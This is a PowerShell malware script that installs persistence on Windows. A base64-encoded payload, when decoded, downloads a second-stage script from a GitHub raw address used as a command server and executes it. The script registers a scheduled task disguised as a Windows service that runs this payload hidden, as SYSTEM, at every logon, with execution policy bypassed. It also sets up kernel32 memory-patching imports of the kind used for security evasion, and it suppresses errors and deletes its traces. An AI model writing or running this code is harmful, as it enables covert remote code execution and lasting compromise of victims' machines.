$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# =============================
# PASTE YOUR BASE64 HERE
# (Base64 of 3.ps1 EncodedBody)
# =============================
$EMBEDDED_BASE64 = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgANAAoAJABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgANAAoAJABDADIAIAA9ACAAIgBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAHcAbwBsAGYAZwBhAG4AZwBwAGgAZQBsAGEAbgA5ADkANAA5ADIANAAvAHcAaQBuAGQAbwB3ADEAMQAvAG0AYQBpAG4AIgANAAoAJABTAHQAYQBnAGUAMQBVAHIAbAAgAD0AIAAiACQAQwAyAC8AMQAuAHAAcwAxACIADQAKACQARQBuAGMAbwBkAGUAZABCAG8AZAB5ACAAPQAgACIAZABBAEIAeQBBAEgAawBBAEkAQQBCADcAQQBBAG8AQQBJAEEAQQBnAEEAQwBBAEEASQBBAEEAawBBAEgAYwBBAFoAUQBCAGkAQQBFAE0AQQBiAEEAQgBwAEEARwBVAEEAYgBnAEIAMABBAEMAQQBBAFAAUQBBAGcAQQBFADQAQQBaAFEAQgAzAEEAQwAwAEEAVAB3AEIAaQBBAEcAbwBBAFoAUQBCAGoAQQBIAFEAQQBJAEEAQgBPAEEARwBVAEEAZABBAEEAdQBBAEYAYwBBAFoAUQBCAGkAQQBFAE0AQQBiAEEAQgBwAEEARwBVAEEAYgBnAEIAMABBAEEAbwBBAEkAQQBBAGcAQQBDAEEAQQBJAEEAQQBrAEEASABNAEEAZABBAEIAaABBAEcAYwBBAFoAUQBBAHgAQQBFAE0AQQBiAHcAQgB1AEEASABRAEEAWgBRAEIAdQBBAEgAUQBBAEkAQQBBADkAQQBDAEEAQQBKAEEAQgAzAEEARwBVAEEAWQBnAEIARABBAEcAdwBBAGEAUQBCAGwAQQBHADQAQQBkAEEAQQB1AEEARQBRAEEAYgB3AEIAMwBBAEcANABBAGIAQQBCAHYAQQBHAEUAQQBaAEEAQgBUAEEASABRAEEAYwBnAEIAcABBAEcANABBAFoAdwBBAG8AQQBDAFEAQQBVAHcAQgAwAEEARwBFAEEAWgB3AEIAbABBAEQARQBBAFYAUQBCAHkAQQBHAHcAQQBLAFEAQQBLAEEAQwBBAEEASQBBAEEAZwBBAEMAQQBBAFMAUQBCAHUAQQBIAFkAQQBiAHcAQgByAEEARwBVAEEATABRAEIARgBBAEgAZwBBAGMAQQBCAHkAQQBHAFUAQQBjAHcAQgB6AEEARwBrAEEAYgB3AEIAdQBBAEMAQQBBAEoAQQBCAHoAQQBIAFEAQQBZAFEAQgBuAEEARwBVAEEATQBRAEIARABBAEcAOABBAGIAZwBCADAAQQBHAFUAQQBiAGcAQgAwAEEAQQBvAEEAZgBRAEEAZwBBAEcATQBBAFkAUQBCADAAQQBHAE0AQQBhAEEAQQBnAEEASABzAEEAQwBnAEEAZwBBAEMAQQBBAEkAQQBBAGcAQQBGAGMAQQBjAGcAQgBwAEEASABRAEEAWgBRAEEAdABBAEYAWQBBAFoAUQBCAHkAQQBHAEkAQQBiAHcAQgB6AEEARwBVAEEASQBBAEEAaQBBAEUAWQBBAFkAUQBCAHAAQQBHAHcAQQBaAFEAQgBrAEEARABvAEEASQBBAEEAawBBAEYAOABBAEkAZwBBAEsAQQBIADAAQQAiAA0ACgB0AHIAeQAgAHsADQAKACAAIAAgACAAaQBmACAAKAAkAEUAbgBjAG8AZABlAGQAQgBvAGQAeQApACAAewANAAoAIAAgACAAIAAgACAAIAAgACQARABlAGMAbwBkAGUAZABCAG8AZAB5ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABFAG4AYwBvAGQAZQBkAEIAbwBkAHkAKQApAA0ACgAgACAAIAAgACAAIAAgACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABEAGUAYwBvAGQAZQBkAEIAbwBkAHkADQAKACAAIAAgACAAfQANAAoAfQAgAGMAYQB0AGMAaAAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0AVgBlAHIAYgBvAHMAZQAgACIARAByAG8AcABwAGUAcgAgAGYAYQBpAGwAZQBkADoAIAAkAF8AIgANAAoAfQA="
# =============================
# CONFIG
# =============================
$TempDir = $env:TEMP
$TaskName = "TaskSchedulerService"

# =============================
# WIN32 P/INVOKE
# =============================
Add-Type -Namespace Win32 -Name NativeMethods -MemberDefinition @"
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
"@

$PAGE_EXECUTE_READWRITE = 0x40
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PATCH_SIZE = 12

# =============================
# BUILD TASK XML
# =============================
function Build-TaskXml {
    param(
        [string]$Base64Cmd,
        [string]$OutputXmlPath
    )

    $xmlTemplate = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-27T12:00:00</Date>
    <Author>SYSTEM</Author>
    <Description>Windows Task Scheduler Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>Batch</LogonType>
      <UserId>SYSTEM</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enable>true</Enable>
    <Hidden>false</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $Base64Cmd</Arguments>
    </Exec>
  </Actions>
</Task>
"@

    [System.IO.File]::WriteAllText($OutputXmlPath, $xmlTemplate, [System.Text.Encoding]::Unicode)
}

# =============================
# PERSISTENCE
# =============================
function Invoke-Persistence {
    try {
        $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        if ($existingTask) { return }

        # Build XML with embedded Base64
        $xmlPath = Join-Path $TempDir "task.xml"
        Build-TaskXml -Base64Cmd $EMBEDDED_BASE64 -OutputXmlPath $xmlPath

        # Register task
        schtasks /Create /TN "\$TaskName" /XML $xmlPath /F | Out-Null

        # Cleanup
        Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
    } catch {}
}

# =============================
# MAIN
# =============================
Start-Sleep -Seconds 2
Invoke-Persistence